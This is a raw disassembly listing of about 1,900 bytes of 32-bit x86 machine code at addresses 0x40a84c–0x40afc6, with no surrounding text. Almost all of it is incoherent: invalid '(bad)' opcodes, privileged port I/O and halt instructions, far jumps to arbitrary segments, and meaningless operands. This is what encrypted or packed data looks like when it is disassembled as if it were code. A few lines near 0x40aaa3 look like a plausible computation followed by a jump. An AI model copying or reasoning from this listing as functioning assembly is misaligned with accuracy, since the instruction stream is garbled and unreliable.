  40a84c:	mov    BYTE PTR [ecx],cl
  40a84e:	(bad)  
  40a84f:	out    dx,eax
  40a850:	shr    DWORD PTR ds:0x7e6662e9,cl
  40a856:	sbb    eax,0xe2f1c1d5
  40a85b:	jnp    0x40a8d0
  40a85d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a85e:	pop    ebx
  40a85f:	rcr    BYTE PTR [ebp+0x38],cl
  40a862:	mov    al,ds:0x1ddd090b
  40a867:	inc    esi
  40a868:	retf   
  40a869:	test   BYTE PTR [edi],ch
  40a86b:	in     al,0xfc
  40a86d:	cmp    ch,BYTE PTR [ebx]
  40a86f:	cmc    
  40a870:	mov    ebp,0x446c5119
  40a875:	mov    edi,DWORD PTR [edx-0x38]
  40a878:	push   ecx
  40a879:	add    eax,0x34f3cf3c
  40a87e:	arpl   WORD PTR ds:0x62cbeb9d,ax
  40a884:	in     eax,0x3
  40a886:	jp     0x40a8be
  40a888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a889:	jmp    0xc3cf0825
  40a88e:	shl    BYTE PTR [ebx+0x34],0xf9
  40a892:	lea    eax,[edx+0x4b]
  40a895:	cmp    ecx,esp
  40a897:	and    eax,0x6c12f2e7
  40a89c:	(bad)  
  40a89d:	div    BYTE PTR ds:0xa46e08e5
  40a8a3:	dec    ebp
  40a8a4:	dec    ebp
  40a8a5:	or     ebp,ecx
  40a8a7:	fnstsw WORD PTR [ebx]
  40a8a9:	jne    0x40a839
  40a8ab:	int3   
  40a8ac:	add    al,0x67
  40a8ae:	mov    bl,BYTE PTR [ebp+0x26]
  40a8b1:	daa    
  40a8b2:	xchg   edi,eax
  40a8b3:	or     DWORD PTR [eax+0x6],0xffffff8f
  40a8b7:	outs   dx,DWORD PTR ds:[esi]
  40a8b8:	jle    0x40a84e
  40a8ba:	in     eax,dx
  40a8bb:	adc    DWORD PTR [edx-0x55b9b3f9],edx
  40a8c1:	cld    
  40a8c2:	ret    
  40a8c3:	mov    ecx,0x6ddda230
  40a8c8:	push   ecx
  40a8c9:	loope  0x40a8cc
  40a8cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8cc:	inc    eax
  40a8cd:	out    dx,eax
  40a8ce:	mov    BYTE PTR [edx+edx*2+0xc],cl
  40a8d2:	mov    dl,0x65
  40a8d4:	dec    esi
  40a8d5:	jbe    0x40a8bd
  40a8d7:	pop    esi
  40a8d8:	scas   al,BYTE PTR es:[edi]
  40a8d9:	xor    DWORD PTR [eax-0x127681b0],0x31
  40a8e0:	xchg   ebp,eax
  40a8e1:	xor    DWORD PTR [edx+ebp*4-0x61],ebx
  40a8e5:	stc    
  40a8e6:	jns    0x40a87a
  40a8e8:	fldl2e 
  40a8ea:	cli    
  40a8eb:	cwde   
  40a8ec:	inc    ebx
  40a8ed:	enter  0x97a9,0x3b
  40a8f1:	inc    ebp
  40a8f2:	add    eax,0x40cb6aaf
  40a8f7:	adc    ebp,edi
  40a8f9:	fnsave [edx]
  40a8fb:	adc    eax,0x4c3f3b3b
  40a900:	test   eax,0x8a59a7a
  40a905:	fdivr  DWORD PTR [esi-0x2d]
  40a908:	(bad)  
  40a909:	imul   esi,DWORD PTR [edi],0x93151613
  40a90f:	jecxz  0x40a946
  40a911:	ins    DWORD PTR es:[edi],dx
  40a912:	mov    edx,0xeb66096b
  40a917:	stc    
  40a918:	aaa    
  40a919:	xor    edx,esi
  40a91b:	into   
  40a91c:	dec    edx
  40a91d:	sub    al,0x80
  40a91f:	(bad)  
  40a920:	repz sbb BYTE PTR [ebp+edx*4-0x55],ah
  40a925:	jmp    0x40a94b
  40a927:	mov    edx,0x663a69ab
  40a92c:	loope  0x40a941
  40a92e:	add    eax,0x318989b8
  40a933:	adc    ecx,eax
  40a935:	cmp    BYTE PTR [eax+edx*1-0xb],0xb6
  40a93a:	pop    ecx
  40a93b:	lods   eax,DWORD PTR fs:[esi]
  40a93d:	fcmove st,st(6)
  40a93f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a940:	xor    eax,0x9ab69bbe
  40a945:	jmp    0x40a8dd
  40a947:	cld    
  40a948:	mov    ds:0x9ac713c9,eax
  40a94d:	loope  0x40a92d
  40a94f:	outs   dx,BYTE PTR ds:[esi]
  40a950:	repz loope 0x40a97d
  40a953:	pop    ebx
  40a954:	in     al,dx
  40a955:	sub    al,0x2b
  40a957:	aam    0xb3
  40a959:	repnz test BYTE PTR [edi],bl
  40a95c:	sar    BYTE PTR [ecx],cl
  40a95e:	bound  ecx,QWORD PTR [ecx+0x73]
  40a961:	mov    cl,0x8c
  40a963:	adc    BYTE PTR [eax+esi*1+0x3bd68d45],0xaa
  40a96b:	push   esi
  40a96c:	js     0x40a940
  40a96e:	and    DWORD PTR [ecx+0x20],eax
  40a971:	clc    
  40a972:	sub    bh,BYTE PTR [edi+0x489d8f0f]
  40a978:	mov    ebx,0x22801ec4
  40a97d:	inc    eax
  40a97e:	imul   edi,DWORD PTR [ebx-0x20138a81],0x1d2fe531
  40a988:	add    eax,0x60337bad
  40a98d:	sub    dl,BYTE PTR [esi-0x54]
  40a990:	test   eax,0x4908361d
  40a995:	push   ds
  40a996:	(bad)  
  40a997:	sbb    eax,0xbe36e28a
  40a99c:	jae    0x40a9ab
  40a99e:	mov    ah,0x2a
  40a9a0:	sub    eax,0x1b1372b0
  40a9a5:	(bad)  
  40a9a6:	jno    0x40a953
  40a9a8:	lock adc al,0x31
  40a9ab:	or     bl,BYTE PTR [edx+esi*2+0x11]
  40a9af:	hlt    
  40a9b0:	mov    ecx,0x1d8f3339
  40a9b5:	adc    eax,0x9c2ffe
  40a9ba:	pop    ds
  40a9bb:	inc    ecx
  40a9bc:	mov    bl,bh
  40a9be:	push   es
  40a9bf:	(bad)  ds:0x9b86ba39
  40a9c5:	inc    esi
  40a9c6:	mov    ah,0x51
  40a9c8:	rol    ebx,0x7b
  40a9cb:	ret    
  40a9cc:	cs mov edi,0xaa897006
  40a9d2:	test   eax,0xe9937617
  40a9d7:	test   esp,eax
  40a9d9:	int3   
  40a9da:	(bad)  
  40a9db:	sub    ebp,DWORD PTR [esi+0x56]
  40a9de:	gs int3 
  40a9e0:	and    DWORD PTR [eax-0x3a],esp
  40a9e3:	inc    edx
  40a9e4:	loop   0x40aa25
  40a9e6:	pop    ss
  40a9e7:	call   0x40b8:0x5aba94e5
  40a9ee:	xchg   ebp,eax
  40a9ef:	xlat   BYTE PTR ds:[ebx]
  40a9f0:	out    0x59,eax
  40a9f2:	div    DWORD PTR [esi-0x5]
  40a9f5:	xchg   ecx,eax
  40a9f6:	inc    edi
  40a9f7:	fcom   st(4)
  40a9f9:	mov    bl,0x44
  40a9fb:	std    
  40a9fc:	add    al,0xb2
  40a9fe:	push   eax
  40a9ff:	ds fcmovu st,st(6)
  40aa02:	sar    BYTE PTR [ebp-0x7730d213],0xc
  40aa09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa0a:	cmp    DWORD PTR [edi],edx
  40aa0c:	xlat   BYTE PTR ds:[ebx]
  40aa0d:	jl     0x40a9d2
  40aa0f:	and    DWORD PTR [eax],0xd3b2c661
  40aa15:	in     eax,0xe1
  40aa17:	test   ecx,edi
  40aa19:	xlat   BYTE PTR ds:[ebx]
  40aa1a:	iret   
  40aa1b:	add    ebx,DWORD PTR es:[edi+eax*8]
  40aa1f:	inc    esi
  40aa20:	ficom  DWORD PTR [edi-0x3f91e585]
  40aa26:	in     al,dx
  40aa27:	xor    dl,0xb
  40aa2a:	push   edi
  40aa2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa2c:	les    edi,FWORD PTR [ecx+0x32]
  40aa2f:	jb     0x40a9b7
  40aa31:	aaa    
  40aa32:	sbb    BYTE PTR [edi],al
  40aa34:	dec    ebp
  40aa35:	push   edi
  40aa36:	sbb    DWORD PTR [esi],esi
  40aa38:	mov    ebp,esi
  40aa3a:	pop    ds
  40aa3b:	pop    esi
  40aa3c:	xor    ah,BYTE PTR [ebx]
  40aa3e:	jle    0x40aabe
  40aa40:	test   bh,bl
  40aa42:	pop    es
  40aa43:	dec    ebp
  40aa44:	mov    ds,WORD PTR [eax+0x78ac17bf]
  40aa4a:	and    BYTE PTR ds:0xdf0ab1c4,0x4c
  40aa51:	in     al,dx
  40aa52:	gs cld 
  40aa54:	retf   0x76be
  40aa57:	loop   0x40aa02
  40aa59:	xchg   BYTE PTR [ecx],ah
  40aa5b:	sahf   
  40aa5c:	or     al,0x54
  40aa5e:	cli    
  40aa5f:	call   0xf716:0x7107d424
  40aa66:	popf   
  40aa67:	xchg   ebp,eax
  40aa68:	loope  0x40aa73
  40aa6a:	repz loop 0x40aa6c
  40aa6d:	js     0x40aa02
  40aa6f:	adc    ecx,eax
  40aa71:	push   ds
  40aa72:	sub    BYTE PTR [ecx+0x6cdcc0b4],al
  40aa78:	inc    edi
  40aa79:	xor    edx,ebp
  40aa7b:	mov    cl,0xab
  40aa7d:	jge    0x40aad2
  40aa7f:	add    ebp,edx
  40aa81:	mov    esp,0x9b537f3e
  40aa86:	scas   eax,DWORD PTR es:[edi]
  40aa87:	imul   esp,esi,0xffffffaa
  40aa8a:	sub    al,0xc8
  40aa8c:	sub    al,0xb6
  40aa8e:	or     DWORD PTR [eax-0x24453ecd],esi
  40aa94:	jb     0x40aac8
  40aa96:	add    BYTE PTR [ebx],al
  40aa98:	ret    0x4589
  40aa9b:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0x5e2aeabc
  40aacc:	fcom   DWORD PTR [esp+esi*8+0x62]
  40aad0:	bound  edx,QWORD PTR [eax]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx+0x48]
  40aad6:	xor    DWORD PTR [edx-0x73],esp
  40aad9:	test   eax,0x26afee9d
  40aade:	cmp    eax,0x8cee8d30
  40aae3:	mov    BYTE PTR [edx+edi*1],bl
  40aae6:	inc    ebx
  40aae7:	push   esi
  40aae8:	loopne 0x40ab36
  40aaea:	rcr    DWORD PTR [eax-0x19],1
  40aaed:	mov    ebp,0x94816eeb
  40aaf2:	jmp    0xe844:0x6e20a307
  40aaf9:	pushf  
  40aafa:	dec    esi
  40aafb:	adc    al,0xd
  40aafd:	sub    DWORD PTR [ecx+0xebc062e],0x7fb07bd2
  40ab07:	sar    BYTE PTR [esp+ecx*1+0x2b],1
  40ab0b:	dec    esp
  40ab0c:	mov    ecx,0xdd277ace
  40ab11:	out    dx,al
  40ab12:	push   es
  40ab13:	imul   esp,DWORD PTR [edx+0x30],0xffffffbd
  40ab17:	fist   WORD PTR [ebx-0x716914a2]
  40ab1d:	out    0x46,eax
  40ab1f:	dec    esp
  40ab20:	mov    edi,0x6ce95a09
  40ab25:	mov    eax,0x873a8c5c
  40ab2a:	push   esp
  40ab2b:	into   
  40ab2c:	sub    ebp,DWORD PTR [ebp+eax*4-0x36]
  40ab30:	cmp    DWORD PTR [edx+0x50b4fe47],ebp
  40ab36:	or     DWORD PTR [esi+0x3815d5f],0xffffffdb
  40ab3d:	dec    ebp
  40ab3e:	jne    0x40ab20
  40ab40:	jmp    0xc4f2:0xd4c8432b
  40ab47:	arpl   cx,cx
  40ab49:	cmp    eax,DWORD PTR [edx+0x2e712a85]
  40ab4f:	or     BYTE PTR [edi+0x6946bf30],0xa9
  40ab56:	lods   al,BYTE PTR ds:[esi]
  40ab57:	push   0xffffffaf
  40ab59:	das    
  40ab5a:	mov    al,ds:0x70d3692c
  40ab5f:	push   esi
  40ab60:	lods   eax,DWORD PTR ds:[esi]
  40ab61:	mov    DWORD PTR [ebp-0x34],ebp
  40ab64:	mov    ch,bh
  40ab66:	mov    ah,0x3e
  40ab68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab69:	jecxz  0x40abaa
  40ab6b:	stc    
  40ab6c:	mov    bh,0x21
  40ab6e:	jge    0x40ab86
  40ab70:	shl    DWORD PTR [edi+0xc],cl
  40ab73:	or     bl,BYTE PTR [eax+0x57]
  40ab76:	mov    bh,0xcd
  40ab78:	dec    ebx
  40ab79:	retf   0xe5ff
  40ab7c:	bound  edx,QWORD PTR [ebp+0x7bd86d0f]
  40ab82:	retf   0xcfab
  40ab85:	sub    al,BYTE PTR [esi]
  40ab87:	push   0x1d90b461
  40ab8c:	mov    edi,0xb29a6904
  40ab91:	into   
  40ab92:	jmp    0x40abea
  40ab94:	inc    ebx
  40ab95:	mov    BYTE PTR [esi-0x5b],cl
  40ab98:	arpl   sp,di
  40ab9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab9b:	call   0x22a2:0x758b5fe2
  40aba2:	fs out dx,eax
  40aba4:	sbb    edi,ebp
  40aba6:	and    al,0xe2
  40aba8:	fs dec ebp
  40abaa:	aad    0x0
  40abac:	call   0xcf6cc867
  40abb1:	out    0xe1,al
  40abb3:	or     DWORD PTR [ebp+ecx*1-0x35],ebp
  40abb7:	jp     0x40abaf
  40abb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abba:	popa   
  40abbb:	inc    ecx
  40abbc:	lock and al,0xd4
  40abbf:	push   edi
  40abc0:	push   edi
  40abc1:	addr16 repz push ecx
  40abc4:	xchg   ebx,eax
  40abc5:	jo     0x40abcb
  40abc7:	xchg   DWORD PTR [ecx+0x35bfc72e],esp
  40abcd:	stc    
  40abce:	das    
  40abcf:	aad    0x78
  40abd1:	not    esp
  40abd3:	sub    DWORD PTR [ebx-0x5],ebx
  40abd6:	nop
  40abd7:	add    DWORD PTR ds:0xe55befd9,esp
  40abdd:	and    ecx,esi
  40abdf:	xchg   edi,eax
  40abe0:	(bad)  
  40abe1:	ds push edi
  40abe3:	xchg   edi,eax
  40abe4:	pop    eax
  40abe5:	aas    
  40abe6:	xchg   edi,eax
  40abe7:	int3   
  40abe8:	fcom   QWORD PTR [edi]
  40abea:	jmp    0x195e8176
  40abef:	inc    esp
  40abf0:	mov    eax,ds:0x8044e254
  40abf5:	sbb    edi,DWORD PTR [edx+0x2c]
  40abf8:	jmp    0x40abb6
  40abfa:	mov    bl,0x9e
  40abfc:	ror    ecx,0x91
  40abff:	jo     0x40abb7
  40ac01:	add    al,0x70
  40ac03:	iret   
  40ac04:	shr    ah,cl
  40ac06:	inc    edx
  40ac07:	xchg   dh,bh
  40ac09:	sub    al,0x94
  40ac0b:	lods   al,BYTE PTR ds:[esi]
  40ac0c:	enter  0xf5b2,0xe7
  40ac10:	cmp    DWORD PTR [esi+ecx*8-0x31],0x6f2075d8
  40ac18:	mov    al,ds:0x2ecf7119
  40ac1d:	dec    edx
  40ac1e:	cld    
  40ac1f:	fnstenv [ebp+0x2a2efdf0]
  40ac25:	xchg   esi,eax
  40ac26:	outs   dx,BYTE PTR ds:[esi]
  40ac27:	sbb    eax,0xfcc00bbd
  40ac2c:	pop    edx
  40ac2d:	psubusw mm6,QWORD PTR [eax]
  40ac30:	inc    ecx
  40ac31:	test   BYTE PTR [ecx-0x4],0x6c
  40ac35:	cmp    cl,bl
  40ac37:	dec    edi
  40ac38:	push   esp
  40ac39:	ins    BYTE PTR es:[edi],dx
  40ac3a:	arpl   WORD PTR [ebp-0x108c98e4],cx
  40ac40:	push   cs
  40ac41:	mov    edi,DWORD PTR [esi]
  40ac43:	leave  
  40ac44:	repz and eax,0xe61642db
  40ac4a:	imul   ebx,eax,0xd90d7bd6
  40ac50:	cmp    BYTE PTR [ebx+edi*4-0x63],al
  40ac54:	xor    eax,0x4f37088f
  40ac59:	jp     0x40ac00
  40ac5b:	or     eax,0x6cafb6e1
  40ac60:	mov    ds,WORD PTR [ebx]
  40ac62:	add    bh,BYTE PTR [esi+0x540e81f4]
  40ac68:	lods   al,BYTE PTR ds:[esi]
  40ac69:	adc    eax,0xe1eed201
  40ac6e:	xchg   edi,eax
  40ac6f:	fidivr DWORD PTR [edi+0xdea304e]
  40ac75:	aaa    
  40ac76:	loop   0x40acd3
  40ac78:	add    edx,DWORD PTR [edx+0x7670add5]
  40ac7e:	ret    0x2009
  40ac81:	dec    ecx
  40ac82:	pusha  
  40ac83:	xor    ebx,esi
  40ac85:	add    DWORD PTR [ecx-0x23b96bf5],ebp
  40ac8b:	repz mov bh,BYTE PTR [edi*8-0x703b16e4]
  40ac93:	adc    BYTE PTR [eax+0x41],0xdb
  40ac97:	pusha  
  40ac98:	xchg   ecx,eax
  40ac99:	cmp    BYTE PTR [edi],bh
  40ac9b:	mov    esi,0x7e9c37b1
  40aca0:	mov    bl,BYTE PTR [esi+0x7b]
  40aca3:	push   ebx
  40aca4:	cmp    DWORD PTR [ecx-0x6e],esp
  40aca7:	call   0xd080:0x33254363
  40acae:	add    DWORD PTR [edi],ebp
  40acb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acb1:	mov    edx,0x431937cc
  40acb6:	(bad)  
  40acb7:	jge    0x40aca9
  40acb9:	add    DWORD PTR [edi+0x6cd57574],0xf9275fe5
  40acc3:	fwait
  40acc4:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40acc6:	xor    eax,0x7685ab4a
  40accb:	fcomp  st(3)
  40accd:	sub    cl,BYTE PTR [edx+0x3ecb88f7]
  40acd3:	xchg   ebx,eax
  40acd4:	pop    es
  40acd5:	fwait
  40acd6:	jmp    0x40ad33
  40acd8:	nop
  40acd9:	mov    bh,BYTE PTR [edi+0x12]
  40acdc:	sub    BYTE PTR [edi-0x4a7255ca],bl
  40ace2:	pop    esp
  40ace3:	out    0xc8,al
  40ace5:	fcom   QWORD PTR [esi+0x5a87109e]
  40aceb:	dec    ebx
  40acec:	out    0xf2,eax
  40acee:	add    eax,0xf1c194a3
  40acf3:	inc    ebp
  40acf4:	jno    0x40ac94
  40acf6:	mov    ch,0x32
  40acf8:	ror    DWORD PTR [edx],cl
  40acfa:	push   cs
  40acfb:	repz push eax
  40acfd:	sbb    ebp,DWORD PTR [edx]
  40acff:	dec    esi
  40ad00:	mov    bh,0x64
  40ad02:	ins    DWORD PTR es:[edi],dx
  40ad03:	push   ebx
  40ad04:	push   ebx
  40ad05:	jb     0x40ad40
  40ad07:	pop    eax
  40ad08:	sub    BYTE PTR [ebp-0x3c],al
  40ad0b:	popa   
  40ad0c:	push   eax
  40ad0d:	cwde   
  40ad0e:	sub    eax,DWORD PTR [ecx+edx*4-0x4f6ae45c]
  40ad15:	dec    ebx
  40ad16:	nop
  40ad17:	int3   
  40ad18:	cmp    DWORD PTR [eax-0x3253f5e9],0xee1bf339
  40ad22:	xchg   ebp,eax
  40ad23:	jbe    0x40ad80
  40ad25:	sub    eax,0xbc5f1385
  40ad2a:	cmc    
  40ad2b:	jg     0x40accc
  40ad2d:	inc    ebx
  40ad2e:	int    0x7a
  40ad30:	xor    eax,0xc73070f0
  40ad35:	jne    0x40ad42
  40ad37:	mov    cl,dh
  40ad39:	mov    esp,0x486aeea9
  40ad3e:	fld    st(7)
  40ad40:	fstp   QWORD PTR [esi]
  40ad42:	pushf  
  40ad43:	sub    ebx,DWORD PTR es:[esp+eax*8]
  40ad47:	aam    0x96
  40ad49:	rol    DWORD PTR fs:[ebx+esi*8],0x81
  40ad4e:	pop    edx
  40ad4f:	fdivr  DWORD PTR [esp+0x1efcce4c]
  40ad56:	loope  0x40acf9
  40ad58:	retf   
  40ad59:	pop    ss
  40ad5a:	jmp    DWORD PTR [edx]
  40ad5c:	dec    esi
  40ad5d:	dec    ebp
  40ad5e:	popa   
  40ad5f:	cmp    esp,ecx
  40ad61:	out    dx,al
  40ad62:	cmp    DWORD PTR [ecx+esi*1+0x46c796c1],esi
  40ad69:	sub    al,0xc5
  40ad6b:	sub    bl,BYTE PTR [ebx+0x515ae0fa]
  40ad71:	(bad)  
  40ad73:	je     0x40ada4
  40ad75:	dec    esp
  40ad76:	pop    ebx
  40ad77:	fwait
  40ad78:	cmp    al,0xc2
  40ad7a:	and    BYTE PTR [eax],0xc6
  40ad7d:	test   al,0xba
  40ad7f:	xor    DWORD PTR [ebx-0x22b2e62f],eax
  40ad85:	imul   ebx,DWORD PTR [eax+0x15],0xffffff8a
  40ad89:	adc    ch,bl
  40ad8b:	dec    ecx
  40ad8c:	sub    ah,dh
  40ad8e:	adc    ch,BYTE PTR [ebp-0x61]
  40ad91:	dec    eax
  40ad92:	fxam   
  40ad94:	popa   
  40ad95:	xchg   ecx,eax
  40ad96:	leave  
  40ad97:	mov    edx,0x7c0efb4c
  40ad9c:	push   ebp
  40ad9d:	pop    ecx
  40ad9e:	loop   0x40ad89
  40ada0:	and    al,0x67
  40ada2:	lds    ebx,FWORD PTR cs:[esi+0xc]
  40ada6:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40ada8:	mul    BYTE PTR [edx+0x61]
  40adab:	mov    ebx,0x31856e59
  40adb0:	adc    edi,DWORD PTR [ecx+0x2d]
  40adb3:	ins    BYTE PTR es:[edi],dx
  40adb4:	ss mov dh,0xec
  40adb7:	inc    edi
  40adb8:	lahf   
  40adb9:	loopne 0x40add6
  40adbb:	xor    esi,DWORD PTR [esi+0xa]
  40adbe:	jecxz  0x40ad80
  40adc0:	adc    ch,bh
  40adc2:	add    edi,DWORD PTR [edx-0x402cbcca]
  40adc8:	dec    edx
  40adc9:	add    esp,0x5e97c8ec
  40adcf:	ja     0x40adaf
  40add1:	cmc    
  40add2:	xor    dl,bh
  40add4:	sbb    DWORD PTR [ebx-0x670a169b],esi
  40adda:	int3   
  40addb:	cmc    
  40addc:	jo     0x40ad98
  40adde:	arpl   WORD PTR [edi-0x3eb415ed],bp
  40ade4:	xor    BYTE PTR [ebx],0x98
  40ade7:	ja     0x40ae34
  40ade9:	inc    eax
  40adea:	mov    esi,0x3a742845
  40adef:	fsub   QWORD PTR [edx+esi*2]
  40adf2:	(bad)  
  40adf3:	and    dh,BYTE PTR [edi-0x4c4e8997]
  40adf9:	mov    WORD PTR [edi+ebx*4+0xc59bbbe],ss
  40ae00:	dec    ecx
  40ae01:	lahf   
  40ae02:	pop    ds
  40ae03:	mov    al,0x59
  40ae05:	shl    DWORD PTR [ebx],cl
  40ae07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae08:	sub    edx,0x7f57086e
  40ae0e:	inc    ebx
  40ae0f:	or     cl,BYTE PTR [edi+edi*4-0x57]
  40ae13:	adc    dl,BYTE PTR gs:[ecx]
  40ae16:	or     al,0xf3
  40ae18:	and    al,0xd8
  40ae1a:	inc    BYTE PTR ds:0xd4b1550e
  40ae20:	sbb    al,0x63
  40ae22:	sbb    DWORD PTR [ebx-0x40],0xffffffe7
  40ae26:	jge    0x40ae30
  40ae28:	push   edx
  40ae29:	out    dx,al
  40ae2a:	pusha  
  40ae2b:	pusha  
  40ae2c:	loop   0x40ae2c
  40ae2e:	adc    eax,0xede88d25
  40ae33:	mov    eax,0xf01c75cf
  40ae38:	fdivr  QWORD PTR [eax-0x37b9dffc]
  40ae3e:	sub    ecx,esp
  40ae40:	jle    0x40aebd
  40ae42:	or     ecx,DWORD PTR [ebp+0x4473c9b1]
  40ae48:	test   DWORD PTR [esi+0x7a],0xfa479e29
  40ae4f:	or     bl,BYTE PTR [ecx]
  40ae51:	icebp  
  40ae52:	xor    ebp,DWORD PTR [ecx+ebx*2]
  40ae55:	mov    edx,0x1c3d338e
  40ae5a:	xor    ch,cl
  40ae5c:	xor    ch,BYTE PTR [esi]
  40ae5e:	rcr    DWORD PTR [eax-0x11],0x4e
  40ae62:	rcr    BYTE PTR [ebx],1
  40ae64:	adc    BYTE PTR [eax+0x4c9e25c9],bl
  40ae6a:	into   
  40ae6b:	sbb    DWORD PTR [ebx-0x1616a3fa],edi
  40ae71:	data16 data16 rcr BYTE PTR [ebx+0x1f],0x2b
  40ae77:	and    DWORD PTR [esi-0x1643efe4],esp
  40ae7d:	push   eax
  40ae7e:	push   ebp
  40ae7f:	sti    
  40ae80:	out    dx,eax
  40ae81:	pop    ebp
  40ae82:	xor    al,0xec
  40ae84:	sbb    DWORD PTR [edi+0x3a6c4017],esp
  40ae8a:	stos   DWORD PTR es:[edi],eax
  40ae8b:	enter  0xf4b3,0x69
  40ae8f:	test   eax,0x5985a66c
  40ae94:	jp     0x40aed9
  40ae96:	jmp    0x40af0e
  40ae98:	cmc    
  40ae99:	cmp    BYTE PTR [edx+0x39],ch
  40ae9c:	(bad)  
  40ae9d:	imul   ebx,DWORD PTR [eax+0x47],0x46
  40aea1:	mov    cl,BYTE PTR [esi-0x5e]
  40aea4:	xor    eax,0xa70bf6aa
  40aea9:	and    eax,esp
  40aeab:	mov    ch,0xb8
  40aead:	push   ebp
  40aeae:	and    cl,bh
  40aeb0:	inc    edx
  40aeb1:	sbb    BYTE PTR [edx-0x620ec7b1],al
  40aeb7:	cs jmp 0x40af25
  40aeba:	rcl    ch,0xfc
  40aebd:	mov    ch,BYTE PTR [eax+0x5e]
  40aec0:	mov    ds:0xf3113e38,eax
  40aec5:	rcl    DWORD PTR [edi+0x5b0119e9],1
  40aecb:	les    esp,FWORD PTR [ebp+ebp*8+0x4a]
  40aecf:	push   0xb07cb3
  40aed4:	adc    edi,esp
  40aed6:	jg     0x40ae6e
  40aed8:	jnp    0x40af28
  40aeda:	jg     0x40aeee
  40aedc:	add    BYTE PTR [esi+0x45335444],cl
  40aee2:	mov    edi,0xdc610065
  40aee7:	inc    edx
  40aee8:	sbb    eax,0x85e2613a
  40aeed:	push   edi
  40aeee:	mov    dl,bl
  40aef0:	adc    DWORD PTR [esi],eax
  40aef2:	or     al,0xea
  40aef4:	push   eax
  40aef5:	leave  
  40aef6:	int3   
  40aef7:	xor    bh,BYTE PTR [ebx+0x200e224b]
  40aefd:	sbb    eax,edi
  40aeff:	cmp    esp,DWORD PTR [eax-0x297e87fb]
  40af05:	dec    edi
  40af06:	xor    ah,BYTE PTR [esi-0x1ad82004]
  40af0c:	pop    esi
  40af0d:	xor    BYTE PTR [ebx+0x1d6d38f7],ch
  40af13:	pop    edx
  40af14:	cli    
  40af15:	jp     0x40af91
  40af17:	ins    BYTE PTR es:[edi],dx
  40af18:	jp     0x40af93
  40af1a:	loop   0x40aebb
  40af1c:	sti    
  40af1d:	or     eax,0x53cb7237
  40af22:	add    esp,ebp
  40af24:	jnp    0x40af36
  40af26:	cli    
  40af27:	cmp    ebx,DWORD PTR [eax-0x18]
  40af2a:	jmp    0x7dc3fdf5
  40af2f:	pop    ebx
  40af30:	hlt    
  40af31:	mul    ecx
  40af33:	push   ecx
  40af34:	or     eax,0xb50a8d80
  40af39:	xor    DWORD PTR [ebx+edx*2],ecx
  40af3c:	xor    DWORD PTR [edi-0x44],ebx
  40af3f:	pop    ebx
  40af40:	xor    esi,ebp
  40af42:	iret   
  40af43:	sbb    ebp,DWORD PTR [ecx]
  40af45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af46:	cmp    al,0xb4
  40af48:	cmp    dh,al
  40af4a:	inc    ebx
  40af4b:	jp     0x40afa5
  40af4d:	daa    
  40af4e:	mov    ebp,0xe10db0c8
  40af53:	ins    BYTE PTR es:[edi],dx
  40af54:	mov    ?,esp
  40af56:	mov    ah,0xff
  40af58:	dec    edi
  40af59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af5a:	xchg   ecx,eax
  40af5b:	pop    esp
  40af5c:	push   eax
  40af5d:	mov    eax,ds:0x2bb5ca42
  40af62:	mul    dh
  40af64:	mov    BYTE PTR [ebx-0x69ea8af9],ch
  40af6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af6b:	adc    esp,esi
  40af6d:	jb     0x40afdf
  40af6f:	dec    esi
  40af70:	mov    cl,0x1f
  40af72:	inc    ecx
  40af73:	jg     0x40af39
  40af75:	mov    WORD PTR [edi+edx*8+0x71fb8024],cs
  40af7c:	pop    es
  40af7d:	push   edx
  40af7e:	inc    ebx
  40af7f:	rcl    BYTE PTR [edi+eax*8-0x20ce304e],1
  40af86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af87:	pop    ecx
  40af88:	mov    edi,0x46b6a3fd
  40af8d:	out    0x44,al
  40af8f:	inc    esp
  40af90:	sbb    BYTE PTR [ebx],bl
  40af92:	or     al,BYTE PTR [ecx-0x7c]
  40af95:	leave  
  40af96:	icebp  
  40af97:	cdq    
  40af98:	jno    0x40af52
  40af9a:	retf   0xb3eb
  40af9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af9e:	sbb    DWORD PTR [edi+eax*4+0x1],esp
  40afa2:	push   ds
  40afa3:	fnstenv [eax]
  40afa5:	leave  
  40afa6:	inc    ebp
  40afa7:	repz fsub QWORD PTR [ebx+0x7355588e]
  40afae:	sar    DWORD PTR [esi+ebx*1],1
  40afb1:	cmp    al,0x5
  40afb3:	mov    eax,ds:0xdda0e5df
  40afb8:	sub    al,0xbb
  40afba:	fimul  WORD PTR [ebp-0x78]
  40afbd:	and    al,0xfe
  40afbf:	lahf   
  40afc0:	cmp    al,0x97
  40afc2:	adc    DWORD PTR [edi+eax*8+0x63],edx
  40afc6:	hlt    
